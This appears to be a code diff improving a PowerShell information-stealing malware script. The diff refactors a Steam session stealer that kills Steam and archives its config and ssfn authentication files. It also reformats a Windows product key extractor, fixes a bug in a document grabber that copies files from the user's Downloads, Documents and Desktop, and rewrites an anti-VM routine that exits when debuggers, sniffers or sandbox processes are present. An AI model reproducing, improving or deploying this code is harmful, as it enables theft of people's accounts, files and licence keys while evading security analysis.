@@ -116,23 +116,23 @@ function EXFILTRATE-DATA {
     Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
     }
     signalstealer 
-	 
+
     # Steam Session Stealer
 	function steamstealer {
-     $processName = "steam"
-     try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
-     $steam_session = "$env:localappdata\temp\steam-session"
-     New-Item -ItemType Directory -Force -Path $steam_session
-     $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
-     Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
-	 $ssfnfiles = @("ssfn$1")
-     foreach($file in $ssfnfiles) {
-     Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
-     }
-	 $steam_zip = "$env:localappdata\temp\steam-session.zip"
-     Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
-     }
-     steamstealer 
+        $processName = "steam"
+        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
+        $steam_session = "$env:localappdata\temp\steam-session"
+        New-Item -ItemType Directory -Force -Path $steam_session
+        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
+        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
+        $ssfnfiles = @("ssfn$1")
+        foreach($file in $ssfnfiles) {
+            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
+        }
+        $steam_zip = "$env:localappdata\temp\steam-session.zip"
+        Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
+    }
+    steamstealer 
 	
 	# Desktop screenshot
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
@@ -156,7 +156,7 @@ function EXFILTRATE-DATA {
         if ($disk.Size -gt 0) {
             $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
             $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
-    		$usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
+            $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
             [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
 			[int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
             [PSCustomObject]@{
@@ -175,24 +175,29 @@ function EXFILTRATE-DATA {
     
 	#Extracts Product Key
     function Get-ProductKey {
-      $map="BCDFGHJKMPQRTVWXY2346789"
-      $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
-      $ProductKey = ""
-      for ($i = 24; $i -ge 0; $i--) {
-        $r = 0
-        for ($j = 14; $j -ge 0; $j--) {
-          $r = ($r * 256) -bxor $value[$j]
-          $value[$j] = [math]::Floor([double]($r / 24))
-          $r = $r % 24
+        $map = "BCDFGHJKMPQRTVWXY2346789"
+        $value = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
+        $ProductKey = ""
+        
+        for ($i = 24; $i -ge 0; $i--) {
+            $r = 0
+            
+            for ($j = 14; $j -ge 0; $j--) {
+                $r = ($r * 256) -bxor $value[$j]
+                $value[$j] = [math]::Floor([double]($r / 24))
+                $r = $r % 24
+            }
+            
+            $ProductKey = $map[$r] + $ProductKey
+        
+            if (($i % 5) -eq 0 -and $i -ne 0) {
+                $ProductKey = "-" + $ProductKey
+            }
         }
-        $ProductKey = $map[$r] + $ProductKey
-    
-        if (($i % 5) -eq 0 -and $i -ne 0) {
-          $ProductKey = "-" + $ProductKey
-        }
-      }
-      $ProductKey
+        
+        $ProductKey
     }
+    
     $ProductKey = Get-ProductKey
     Get-ProductKey > $env:localappdata\temp\ProductKey.txt	
 	
@@ -306,7 +311,7 @@ function EXFILTRATE-DATA {
     )
     $dest = "$env:localappdata\Temp\Files Grabber"
     $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
-    [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) –join "|") + ")"
+    [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
     (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
     }
     GrabFiles
@@ -458,61 +463,72 @@ function Request-Admin {
 }
 
 function Invoke-ANTIVM {
-function antivm
-{
-   "autoruns",
-   "autorunsc",
-   "dumpcap",
-   "Fiddler",
-   "fakenet",
-   "hookexplorer",
-   "immunitydebugger",
-   "httpdebugger",
-   "importrec",
-   "lordpe",
-   "petools",
-   "processhacker",
-   "resourcehacker",
-   "scylla_x64",
-   "sandman",
-   "sysinspector",
-   "tcpview",
-   "die",
-   "dumpcap",
-   "filemon",
-   "idaq",
-   "idaq64",
-   "joeboxcontrol",
-   "joeboxserver",
-   "ollydbg",
-   "proc_analyzer",
-   "procexp",
-   "procmon",
-   "pestudio",
-   "qemu-ga",
-   "qga",
-   "regmon",
-   "sniff_hit",
-   "sysanalyzer",
-   "tcpview",
-   "windbg",
-   "wireshark",
-   "x32dbg",
-   "x64dbg",
-   "vmwareuser",
-   "vmacthlp",
-   "vboxservice",
-   "vboxtray",
-   "xenservice"
+    function antivm {
+        return @(
+            "autoruns",
+            "autorunsc",
+            "dumpcap",
+            "Fiddler",
+            "fakenet",
+            "hookexplorer",
+            "immunitydebugger",
+            "httpdebugger",
+            "importrec",
+            "lordpe",
+            "petools",
+            "processhacker",
+            "resourcehacker",
+            "scylla_x64",
+            "sandman",
+            "sysinspector",
+            "tcpview",
+            "die",
+            "dumpcap",
+            "filemon",
+            "idaq",
+            "idaq64",
+            "joeboxcontrol",
+            "joeboxserver",
+            "ollydbg",
+            "proc_analyzer",
+            "procexp",
+            "procmon",
+            "pestudio",
+            "qemu-ga",
+            "qga",
+            "regmon",
+            "sniff_hit",
+            "sysanalyzer",
+            "tcpview",
+            "windbg",
+            "wireshark",
+            "x32dbg",
+            "x64dbg",
+            "vmwareuser",
+            "vmacthlp",
+            "vboxservice",
+            "vboxtray",
+            "xenservice"
+        )
+    }
+    
+    $processnames = antivm
+    $detectedProcesses = $processnames | ForEach-Object {
+        $processName = $_
+        if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            $processName
+        }
+    }
+
+    if ($null -eq $detectedProcesses) { 
+        Invoke-TASKS
+    }
+    else { 
+        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
+        Exit
+    }
 }
-$processnames = antivm
-if(($processnames | ForEach-Object {Get-Process -Name $_ }) -eq $null){ 
-   Invoke-TASKS 
-}
-else{ 
-  exit
-}
-}
+
 
 function Hide-Console
 {
